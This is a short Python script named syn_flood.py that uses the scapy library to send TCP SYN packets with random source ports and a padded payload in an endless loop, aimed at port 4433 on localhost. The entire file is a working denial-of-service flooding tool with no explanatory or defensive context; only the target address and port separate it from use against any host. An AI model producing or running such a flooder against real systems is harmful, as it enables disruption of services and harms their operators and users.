# syn_flood.py
from scapy.all import *
from scapy.layers.inet import IP, TCP

target_ip = "127.0.0.1"
target_port = 4433

def syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * 1024)
    p = ip / tcp / raw
    send(p, loop=1, verbose=0)

if __name__ == "__main__":
    syn_flood(target_ip, target_port)